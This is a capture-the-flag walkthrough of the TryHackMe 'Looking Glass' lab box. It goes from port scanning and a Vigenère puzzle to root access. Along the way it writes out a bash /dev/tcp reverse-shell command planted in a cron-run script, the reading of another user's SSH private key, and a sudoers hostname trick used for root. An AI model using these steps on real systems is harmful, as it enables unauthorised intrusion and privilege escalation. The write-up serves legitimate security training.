## Looking Glass Writup 

> First Let's do a port scan ^^ (nmap)

```
Discovered open port 9122/tcp on 10.10.168.144                                 
Discovered open port 13710/tcp on 10.10.168.144                                
Discovered open port 10873/tcp on 10.10.168.144                                
Discovered open port 13148/tcp on 10.10.168.144                                
Discovered open port 12651/tcp on 10.10.168.144                                
Discovered open port 12038/tcp on 10.10.168.144                                
Discovered open port 10694/tcp on 10.10.168.144                                
Discovered open port 11418/tcp on 10.10.168.144                                
Discovered open port 9923/tcp on 10.10.168.144                                 
Discovered open port 9656/tcp on 10.10.168.144                                 
Discovered open port 9594/tcp on 10.10.168.144                                 
Discovered open port 12138/tcp on 10.10.168.144                                
Discovered open port 10741/tcp on 10.10.168.144                                
Discovered open port 13926/tcp on 10.10.168.144                                
Discovered open port 11540/tcp on 10.10.168.144                                
Discovered open port 9373/tcp on 10.10.168.144                                 
Discovered open port 13477/tcp on 10.10.168.144                                
Discovered open port 12259/tcp on 10.10.168.144                                
Discovered open port 11393/tcp on 10.10.168.144                                
Discovered open port 12175/tcp on 10.10.168.144                                
Discovered open port 11097/tcp on 10.10.168.144                                
Discovered open port 10214/tcp on 10.10.168.144                                
Discovered open port 11386/tcp on 10.10.168.144                                
Discovered open port 9478/tcp on 10.10.168.144                                 
Discovered open port 9889/tcp on 10.10.168.144                                 
Discovered open port 13810/tcp on 10.10.168.144                                
Discovered open port 13823/tcp on 10.10.168.144                                
Discovered open port 13641/tcp on 10.10.168.144                                
Discovered open port 10054/tcp on 10.10.168.144                                
Discovered open port 12268/tcp on 10.10.168.144                                
Discovered open port 11807/tcp on 10.10.168.144                                
Discovered open port 9346/tcp on 10.10.168.144                                 
Discovered open port 13427/tcp on 10.10.168.144                                
Discovered open port 10062/tcp on 10.10.168.144                                
Discovered open port 11731/tcp on 10.10.168.144                                
Discovered open port 13107/tcp on 10.10.168.144                                
Discovered open port 13192/tcp on 10.10.168.144                                
Discovered open port 13195/tcp on 10.10.168.144                                
Discovered open port 12007/tcp on 10.10.168.144                                
Discovered open port 13492/tcp on 10.10.168.144                                
Discovered open port 11986/tcp on 10.10.168.144                                
Discovered open port 11728/tcp on 10.10.168.144                                
Discovered open port 10749/tcp on 10.10.168.144                                
Discovered open port 11684/tcp on 10.10.168.144                                
Discovered open port 12964/tcp on 10.10.168.144                                
Discovered open port 10717/tcp on 10.10.168.144                                
Discovered open port 12844/tcp on 10.10.168.144                                
Discovered open port 10681/tcp on 10.10.168.144                                
Discovered open port 9324/tcp on 10.10.168.144                                 
Discovered open port 12943/tcp on 10.10.168.144                                
Discovered open port 9884/tcp on 10.10.168.144                                 
Discovered open port 10395/tcp on 10.10.168.144                                
Discovered open port 9114/tcp on 10.10.168.144                                 
Discovered open port 12985/tcp on 10.10.168.144                                
Discovered open port 11509/tcp on 10.10.168.144                                
Discovered open port 9815/tcp on 10.10.168.144                                 
Discovered open port 10150/tcp on 10.10.168.144                                
Discovered open port 11596/tcp on 10.10.168.144

```
> oh we can notice a tons of ports open 
```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3f:15:19:70:35:fd:dd:0d:07:a0:50:a3:7d:fa:10:a0 (RSA)
|   256 a8:67:5c:52:77:02:41:d7:90:e7:ed:32:d2:01:d9:65 (ECDSA)
|_  256 26:92:59:2d:5e:25:90:89:09:f5:e5:e0:33:81:77:6a (ED25519)
9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey:
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey:
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey:
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9003/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey:
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)

```
> all of the ports are Dropbear sshd , its the same of open but it's used for low memory devices like embeded system , hence we could try ssh , but we don't have any credentials yet lets try it without providing any thing .

![ssh](imgs/nmap.png)

> after a long journey , I realized that when when it prints higher the right port will be lower than this port that i have tried , Finally i got it between 11700 - 11800 (on my case because every deploy to the machine the port change ^^) lets try more .. 
```
The authenticity of host '[10.10.55.228]:11777 ([10.10.55.228]:11777)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.55.228]:11777' (RSA) to the list of known hosts.
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:	

``` 
> well , Finally i got my port , here there is a challenge to solve lets go to cipher Identifier
![cipher](imgs/cipher.png)
> okey lets try it using "Vigenère Autokey Cipher" 
![key](imgs/key.png)
> We , got our key and our secret , The secret Give us the credentials to the first user **jabberwock**
```
jabberwock@looking-glass:~$ cat user.txt 
}hidden{mht
```
> here we notice a **twasBrillig.sh** executable file . 
```
jabberwock@looking-glass:~$ cat twasBrillig.sh 
wall $(cat /home/jabberwock/poem.txt)
jabberwock@looking-glass:~$ 
```
> if we check /etc/crontab we notice that the file execute at reboot as **tweedledum** user lets do a reverse shell then using *bash* ^^
```
jabberwock@looking-glass:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh

```
> Lucy for us we could use reboot as a root  
```
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot

```
> I'll use this for taking reverse shell:
`bash -i >& /dev/tcp/IP/PORT 0>&1`
```
echo "bash -i >& /dev/tcp/10.2.87.241/9999 0>&1" > twasBrillig.sh 
```
> And lets listen on our port and Reboot ^^
```
$ id
uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)

```
>we got our shell on *tweedledum*^^ , lets upgrade the shell.
```python3 -c "import pty;pty.spawn('/bin/bash')"
```
> we have a file called **humptydumpty.txt** .

```
tweedledum@looking-glass:~$ cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```
> In the first moment i thought its all hex so i used hex to ascii converter and i got a passowd in the last line .
```
Üÿõë@B?ZLÐ¨×í9ÿl¹hhõvk@¹éia¹vÃ­5@»<:îfÍ24ênqCÀ­×?ô1í(9;ÆNÁ\»	&°J¦·d<È_#°^Ñ^6$¸áVÑìÜÁEcuøÊéÃeI |#´sÝ@OúQýI«öwÖ£]!_õc:ì¿Ü]IVAoWö¹wm}ßEÕ°áÖ¬aâ{ïµéÖ$Fgv×ÊÎõDÐ^HÚ(qQÐåoÆ)'s`=
j«½Ö*ïrBØthe password is {hidden}

```
> I didn't know this passwod belong to whom so I read /etc/passwd : 
```
tryhackme:x:1000:1000:TryHackMe:/home/tryhackme:/bin/bash
jabberwock:x:1001:1001:,,,:/home/jabberwock:/bin/bash
tweedledum:x:1002:1002:,,,:/home/tweedledum:/bin/bash
tweedledee:x:1003:1003:,,,:/home/tweedledee:/bin/bash
humptydumpty:x:1004:1004:,,,:/home/humptydumpty:/bin/bash
alice:x:1005:1005:Alice,,,:/home/alice:/bin/bash
```
> I noticed that there is a user with the same name of the file so :
```
su humptydumpty

```
> And we got the third user ^^
```
humptydumpty@looking-glass:~$ id
uid=1004(humptydumpty) gid=1004(humptydumpty) groups=1004(humptydumpty)
```
> we have a file poetry.txt , i really gets tired reading it hahaha , there is nothing valuable.

> After a long searching , i noticed this on the /home directory .

```
humptydumpty@looking-glass:/home$ ls -la
drwx--x--x  6 alice        alice        4096 Jul  3 02:53 alice
drwx------  3 humptydumpty humptydumpty 4096 Oct  4 16:37 humptydumpty
drwxrwxrwx  5 jabberwock   jabberwock   4096 Oct  4 16:17 jabberwock
drwx------  5 tryhackme    tryhackme    4096 Jul  3 03:00 tryhackme
drwx------  3 tweedledee   tweedledee   4096 Jul  3 02:42 tweedledee
drwx------  2 tweedledum   tweedledum   4096 Jul  3 02:42 tweedledum

```
> we can *x* execute on alice directory , hence we could use **cd** permission , lets go check what's in there , first thing we have always to check the Privat key file so :
```
humptydumpty@looking-glass:/home$cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
<<HIDDEN>>
e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----
```
> well well well , We got our why in lets save it and change the permission to **600** and get in:
```
chmod 600 id_rsa
ssh alice@IP -i id_rsa

```
> And we got the fourth user **Alice**:
```
alice@looking-glass:~$ id
uid=1005(alice) gid=1005(alice) groups=1005(alice)
```
> After a long search , i noticed this on the suders.d file :
```
alice@looking-glass:/etc/sudoers.d$ ls -al
total 24
drwxr-xr-x  2 root root 4096 Jul  3  2020 .
drwxr-xr-x 91 root root 4096 Sep 11 11:02 ..
-r--r-----  1 root root  958 Jan 18  2018 README
-r--r--r--  1 root root   49 Jul  3  2020 alice
-r--r-----  1 root root   57 Jul  3  2020 jabberwock
-r--r-----  1 root root  120 Jul  3  2020 tweedles

```
> all these files owned by the root but alice file we can read it as others :

```
alice@looking-glass:/etc/sudoers.d$ cat alice 
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash

```
> Here we have a host name **ssalg-gnikool** its the reversed string of looking-glass so i was sure that the escalation is from here.
> After a long read , i realized that i could use this hostname to run /bin/bash as a root , so i search on sudo manual how i could specify a hostname:
```
-h host, --host=host
                 Run the command on the specified host if the security policy plugin supports remote commands.  Note that the sudoers plugin does not currently support running remote commands.  This may
                 also be used in conjunction with the -l option to list a user's privileges for the remote host.

```
> lets try to do it : 
```
alice@looking-glass:/etc/sudoers.d$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:/etc/sudoers.d# 
```
> Finally , We got the :
```
root@looking-glass:/etc/sudoers.d# cat /root/root.txt 
}hidden{mht

``` 











